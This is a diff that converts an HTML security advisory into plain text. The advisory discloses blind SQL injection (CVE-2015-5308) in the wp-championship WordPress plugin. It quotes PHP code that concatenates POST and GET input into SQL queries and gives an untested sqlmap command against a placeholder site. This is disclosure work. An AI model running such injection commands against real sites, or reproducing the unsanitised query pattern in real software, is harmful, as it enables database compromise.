@@ -1,50 +1,37 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 155&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Blind SQL injection in wp-championship wordpress plugin v5.8&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-10-22&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/wp-championship/">https://wordpress.org/plugins/wp-championship/</a>"&gt;<a href="https://wordpress.org/plugins/wp-championship/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/wp-championship/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;<a href="https://profiles.wordpress.org/tuxlog/">https://profiles.wordpress.org/tuxlog/</a> <a href="http://www.tuxlog.de/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www.tuxlog.de/&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-10-23&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:webmaster@tuxlog.de">webmaster@tuxlog.de</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;wp-championship is a plugin for wordpress letting you play a guessing game of a tournament e.g. soccer.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The following lines do not properly sanitize user input resulting in SQLi, injection points are POST request
-To user, isadmin,mail service,mailresceipt,stellv,champtipp and tippgroup.  Also GET requests to userid. 
-</p><p>The code from cs_admin_users.php is as follows:
-</p><pre>
-69                                 $sql=&amp;quot;select count(*) as anz from $cs_users where userid=&amp;quot;.$<u>POST[&amp;#039;user&amp;#039;].&amp;quot;;&amp;quot;;
- 70                                 $results = $wpdb-&amp;gt;get</u>row($sql);
-</pre>
-<p>.<br/>
-.
-</p><pre>
- 74                                         $sql = &amp;quot;insert into &amp;quot;. $cs_users .&amp;quot; values (&amp;quot;. $_POST[&amp;#039;user&amp;#039;] . &amp;quot;,&amp;quot; . $_POST[&amp;#039;isadmin&amp;#039;] . &amp;quot;,&amp;quot; . $    _POST[&amp;#039;mailservice&amp;#039;] . &amp;quot;,&amp;quot; .$_POST[&amp;#039;mailreceipt&amp;#039;] . &amp;quot;,&amp;quot; . $_POST[&amp;#039;stellv&amp;#039;] . &amp;quot;,&amp;quot;.$_POST[&amp;#039;champtipp&amp;#039;].&amp;quot;,&amp;#039;1900-01-01 00:00:00&amp;#039;,-1,&amp;#039;&amp;quot;.$<u>POST    [&amp;#039;tippgroup&amp;#039;].&amp;quot;&amp;#039;);&amp;quot;;
- 75                                         $results = $wpdb-&amp;gt;query($sql);
-</pre>
-<p>.<br/>
-.
-</p><pre>
-86                                 $sql = &amp;quot;update &amp;quot;.$cs</u>users.&amp;quot; set admin=&amp;quot; . $_POST[&amp;#039;isadmin&amp;#039;] . &amp;quot;, mailservice=&amp;quot; . $_POST[&amp;#039;mailservice&amp;#039;] .    &amp;quot;, mailreceipt=&amp;quot; . $_POST[&amp;#039;mailreceipt&amp;#039;] . &amp;quot;,stellvertreter=&amp;quot; . $_POST[&amp;#039;stellv&amp;#039;] . &amp;quot;,champion=&amp;quot; . $_POST[&amp;#039;champtipp&amp;#039;] . &amp;quot;, tippgroup=&amp;#039;&amp;quot;.$    _POST[&amp;#039;tippgroup&amp;#039;].&amp;quot;&amp;#039; where userid=&amp;quot;.$<u>POST[&amp;#039;user&amp;#039;].&amp;quot;;&amp;quot;;
- 87                                 $results = $wpdb-&amp;gt;query($sql);
-</pre>
-<p>.<br/>
-.
-</p><pre>
-98                         $sql= &amp;quot;delete from &amp;quot;.$cs</u>users.&amp;quot; where userid=&amp;quot;.$<u>GET[&amp;#039;userid&amp;#039;].&amp;quot;;&amp;quot;;
-99                         $results = $wpdb-&amp;gt;query($sql);
-</pre>
-<p>.<br/>
-.
-</p><pre>
-110                         $sql= &amp;quot;select * from  $cs</u>users where userid=&amp;quot;.$<u>GET[&amp;#039;userid&amp;#039;].&amp;quot;;&amp;quot;;
-111                         $results = $wpdb-&amp;gt;get</u>row($sql);&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-5308&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=155"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;Untested&lt;span style="color: #339933;"&gt;:&lt;/span&gt; &lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ sqlmap &lt;span style="color: #339933;"&gt;-&lt;/span&gt;u &lt;span style="color: #0000ff;"&gt;'<a href="http://wp.site:80/wp-admin/wp-championship/cs_admin_users.php&amp;amp;userid">http://wp.site:80/wp-admin/wp-championship/cs_admin_users.php&amp;amp;userid</a>='&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;data&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #0000ff;"&gt;&amp;quot;isadmin=1&amp;amp;user&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;cookie&lt;span style="color: #339933;"&gt;=&lt;/span&gt;AUTH_COOKIE_HERE &lt;span style="color: #339933;"&gt;--&lt;/span&gt;level&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;5&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;risk&lt;span style="color: #339933;"&gt;=&lt;/span&gt;&lt;span style="color: #cc66cc;"&gt;3&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=155">http://www.vapid.dhs.org/advisory.php?v=155</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=155&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=155&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
-</pre>
-<p>&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                Advisory #: 155
+Title: Blind SQL injection in wp-championship wordpress plugin v5.8
+Author:Larry W. Cashdollar, @_larry0
+Date: 2015-10-22
+Download Site: https://wordpress.org/plugins/wp-championship/
+Vendor:https://profiles.wordpress.org/tuxlog/ http://www.tuxlog.de/
+Vendor Notified: 2015-10-23
+Vendor Contact: webmaster@tuxlog.de
+Description: wp-championship is a plugin for wordpress letting you play a
+guessing game of a tournament e.g. soccer.
+Vulnerability:
+The following lines do not properly sanitize user input resulting in SQLi,
+injection points are POST request To user, isadmin,mail
+service,mailresceipt,stellv,champtipp and tippgroup. Also GET requests to
+userid. The code from cs_admin_users.php is as follows: 69 $sql="select count
+(*) as anz from $cs_users where userid=".$_POST['user'].";"; 70 $results =
+$wpdb->get_row($sql); . . 74 $sql = "insert into ". $cs_users ." values (".
+$_POST['user'] . "," . $_POST['isadmin'] . "," . $ _POST['mailservice'] . ","
+.$_POST['mailreceipt'] . "," . $_POST['stellv'] . ",".$_POST
+['champtipp'].",'1900-01-01 00:00:00',-1,'".$_POST ['tippgroup']."');"; 75
+$results = $wpdb->query($sql); . . 86 $sql = "update ".$cs_users." set admin="
+. $_POST['isadmin'] . ", mailservice=" . $_POST['mailservice'] . ",
+mailreceipt=" . $_POST['mailreceipt'] . ",stellvertreter=" . $_POST['stellv'] .
+",champion=" . $_POST['champtipp'] . ", tippgroup='".$ _POST['tippgroup']."'
+where userid=".$_POST['user'].";"; 87 $results = $wpdb->query($sql); . . 98
+$sql= "delete from ".$cs_users." where userid=".$_GET['userid'].";"; 99
+$results = $wpdb->query($sql); . . 110 $sql= "select * from $cs_users where
+userid=".$_GET['userid'].";"; 111 $results = $wpdb->get_row($sql);
+CVE-2015-5308
+JSON:Export
+Exploit Code:
+   1. Untested:
+   2. $ sqlmap -u 'http://wp.site:80/wp-admin/wp-championship/
+      cs_admin_users.php&userid=' --data="isadmin=1&user" --
+      cookie=AUTH_COOKIE_HERE --level=5 --risk=3
+Screen Shots:
+Advisory: http://www.vapid.dhs.org/advisory.php?v=155
